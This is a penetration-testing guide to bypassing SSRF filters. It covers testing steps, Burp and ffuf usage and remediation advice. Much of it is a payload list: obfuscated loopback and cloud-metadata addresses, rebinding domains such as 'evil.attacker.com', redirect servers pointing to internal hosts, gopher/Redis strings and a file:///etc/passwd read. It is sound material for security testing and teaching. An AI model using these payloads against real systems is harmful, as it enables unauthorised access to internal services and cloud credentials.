# SSRF Filter Bypass (IP Obfuscation, Redirects, DNS Rebinding)

## Overview
Developers frequently attempt to block SSRF by denying access to known internal hostnames or IP ranges, but these defenses are notoriously brittle. Dozens of techniques exist to represent the same IP address in alternative forms, leverage redirect chains, exploit DNS rebinding, or abuse parser inconsistencies between the validation layer and the HTTP client library. Understanding these bypass techniques is essential for thorough SSRF testing, because a vulnerable parameter that appears "protected" often still exploitable through one or more of these methods.

## How It Works
Most server-side SSRF filters work by inspecting the URL string before the HTTP request is made. They check if the host part matches blocklisted hostnames or IP ranges. Bypasses work by exploiting the gap between what the filter "sees" and what the underlying HTTP client or OS networking stack actually connects to. For example, the filter may see a hostname it does not recognize as internal, but DNS resolves it to 127.0.0.1; or the filter sees an exotic IP representation that it does not parse correctly, while the OS resolves it correctly to 127.0.0.1; or the URL initially resolves to a public IP that the filter permits, but by the time the HTTP client connects, DNS has changed to return an internal IP (DNS rebinding).

## Impact
- Bypass SSRF mitigations to access internal resources, localhost, and cloud metadata
- Access endpoints protected behind IP allowlists
- Exploit all the same impacts as unrestricted SSRF once the filter is bypassed

## Where to Look
- Any parameter that had apparent SSRF but returned an error like "Invalid URL", "Blocked", "Private IP not allowed"
- Applications that use allowlist/blocklist-based URL validation
- Filters that only check the hostname string without resolving and re-checking the IP
- Applications that follow HTTP redirects without re-validating the destination

## Testing Steps
1. Confirm SSRF exists by getting an OOB callback or reflected response to an external URL.
2. Try to access `http://127.0.0.1/` — if blocked, attempt the bypass categories below.
3. Try alternative IP representations (decimal, hex, octal, mixed, IPv6 forms).
4. Try DNS-based bypasses using services that resolve to 127.0.0.1.
5. Set up a redirect server that first returns a public IP (passing the filter), then redirects to the internal target.
6. Test URL parser confusion (adding credentials, extra path elements, unusual characters).
7. Test protocol confusion (HTTP/HTTPS mismatch, case variation).
8. If the filter only checks the hostname and not the resolved IP: use a custom DNS entry or a domain like `localtest.me`.
9. Try each bypass one at a time in Burp Repeater and note which ones succeed.

## Payloads / Techniques

```
# ===========================
# 1. IP REPRESENTATION TRICKS
# ===========================

# Decimal (dotless)
http://2130706433/         # 127.0.0.1 in decimal
http://2130706433:80/

# Hexadecimal
http://0x7f000001/         # 127.0.0.1 in hex
http://0x7f.0x00.0x00.0x01/
http://0x7f000001:80/

# Octal
http://0177.0.0.1/         # 127.0.0.1 in octal
http://0177.00.00.01/

# Mixed representations
http://0177.0.0.0x1/       # Mixed octal + hex

# Zero-padding
http://127.000.000.001/
http://127.0.0.01/

# Short forms
http://127.1/
http://127.0.1/

# IPv6 loopback
http://[::1]/
http://[0000::1]/
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/  # IPv4-mapped IPv6
http://[::ffff:7f00:1]/

# Cloud metadata in alternative form
http://2852039166/          # 169.254.169.254 in decimal
http://0xa9fea9fe/          # 169.254.169.254 in hex
http://0251.0376.0251.0376/ # 169.254.169.254 in octal

# ====================================
# 2. DNS-BASED BYPASSES
# ====================================

# Domains that resolve to 127.0.0.1
http://localtest.me/
http://spoofed.burpcollaborator.net/  # Resolve to 127.0.0.1
http://127.0.0.1.nip.io/
http://127-0-0-1.nip.io/
http://www.localtest.me/

# Custom DNS — set up your own domain to resolve to 127.0.0.1
# or 169.254.169.254 and use it in payloads
http://evil.attacker.com/  # A record → 127.0.0.1

# subdomain wildcard services that resolve to any IP
http://169.254.169.254.nip.io/

# ==========================
# 3. URL PARSER CONFUSION
# ==========================

# Credentials in URL (host is after @)
http://expected-host@127.0.0.1/
http://expected-host:fakepass@127.0.0.1/
http://127.0.0.1@127.0.0.1/

# Fragment identifier confusion
http://127.0.0.1#expected-host.com/
http://127.0.0.1%23expected-host.com/

# Path confusion
http://expected-host.com/127.0.0.1/

# Protocol case
Http://127.0.0.1/
HTTP://127.0.0.1/
hTtP://127.0.0.1/

# URL encoding
http://%31%32%37%2e%30%2e%30%2e%31/  # 127.0.0.1 URL encoded
http://%31%32%37%2E%30%2E%30%2E%31/

# Double URL encoding
http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/

# Null byte injection
http://127.0.0.1%00.legit.com/
http://127.0.0.1%00@legit.com/

# ================================
# 4. REDIRECT-BASED BYPASSES
# ================================

# If the filter validates the initial URL but follows redirects:
# Step 1: host a redirect at https://your-server.com/redirect that returns:
#   HTTP/1.1 302 Found
#   Location: http://127.0.0.1/admin

# Common redirect via open redirects on trusted domains
https://trusted-domain.com/redirect?url=http://127.0.0.1/
https://accounts.google.com/o/oauth2/auth?...&redirect_uri=http://127.0.0.1/

# PHP redirect server
<?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>

# Python redirect server
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class R(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(301)
        self.send_header('Location','http://127.0.0.1:6379/')
        self.end_headers()
HTTPServer(('0.0.0.0',80),R).serve_forever()
"

# ================================
# 5. DNS REBINDING
# ================================

# Phase 1: DNS resolves to a legitimate/public IP → filter passes
# Phase 2: DNS TTL expires; DNS now resolves to 127.0.0.1 → HTTP client connects to internal
# Requires a DNS server you control with very low TTL (1 second)

# Tools for DNS rebinding:
# singularity (https://github.com/nccgroup/singularity)
# rbndr (https://github.com/taviso/rbndr) — rebind between two IPs

# ================================
# 6. PROTOCOL BYPASSES
# ================================

# Alternative schemes the filter might not check
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO%0d%0a
dict://127.0.0.1:6379/INFO
ftp://127.0.0.1/
sftp://127.0.0.1/
ldap://127.0.0.1/
tftp://127.0.0.1/
jar:file:///tmp/test.jar!/

# ================================
# 7. HOST HEADER TRICKS
# ================================

# If the app uses the Host header to construct internal URLs
Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Real-IP: 127.0.0.1

# ================================
# 8. FILTER LOGIC TRICKS
# ================================

# Trailing dot (DNS bypass in some resolvers)
http://127.0.0.1./
http://localhost./

# Adding port that filter doesn't expect
http://127.0.0.1:80@169.254.169.254/

# IDNA / Unicode hostname normalization
# ① (U+2460) might normalize to '1' in some parsers
http://①②⑦.0.0.1/
```

```bash
# Test bypass list with ffuf
cat > /tmp/ssrf_bypasses.txt << 'EOF'
http://127.0.0.1/
http://localhost/
http://2130706433/
http://0x7f000001/
http://0177.0.0.1/
http://[::1]/
http://127.1/
http://localtest.me/
http://127.0.0.1.nip.io/
http://169.254.169.254/
http://2852039166/
http://0xa9fea9fe/
EOF

ffuf -u "https://target.com/api/fetch?url=FUZZ" \
  -w /tmp/ssrf_bypasses.txt \
  -mc all \
  -fs 0

# Test redirect bypass
curl -s "https://target.com/fetch?url=http://your-redirect-server.com/redir"
```

## Burp Suite Tips
- Use the **SSRF (Server-side request forgery) scanner** in Burp Suite Pro's active scanner.
- In **Intruder**, load a bypass payload list and iterate through all representations for a single target like `127.0.0.1`.
- Install the **SSRF King** BApp which generates bypass payloads automatically.
- Use **Burp Collaborator** to host a redirect that points to internal targets — Collaborator interactions prove the filter-bypassing redirect was followed.
- When testing redirect bypasses, enable "Follow redirects" in **Repeater** options and watch if the server follows to internal resources.
- Compare response sizes in Intruder results — a different size from the default blocked response usually indicates a bypass worked.

## Tools
- Burp Suite Pro (Intruder, Scanner, SSRF King extension)
- SSRFmap — has built-in bypass lists
- ffuf — fast fuzzing with bypass wordlists
- singularity (https://github.com/nccgroup/singularity) — DNS rebinding
- rbndr (https://github.com/taviso/rbndr) — simple DNS rebinding service
- nip.io / sslip.io — wildcard DNS services
- PayloadsAllTheThings SSRF bypass list

## Remediation
- After URL parsing, resolve the hostname to an IP address and verify the resolved IP is not in any blocked range (RFC1918, loopback, link-local, cloud metadata). This eliminates DNS-based and representation-based bypasses.
- Re-validate the IP after every redirect (do not blindly follow redirects without re-checking the new destination).
- Limit the number of redirects followed (e.g., max 3) and validate each redirect URL.
- Use a dedicated HTTP egress proxy (e.g., Squid with an allowlist) as the single outbound gateway — the application code never makes direct HTTP calls.
- Block outbound DNS resolution for internal names (use an internal resolver that does not return loopback for external queries).
- Do not rely on string-matching blocklists — they are insufficient.

## References
https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-localhost-with-various-encodings
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass
https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
https://github.com/nccgroup/singularity
https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
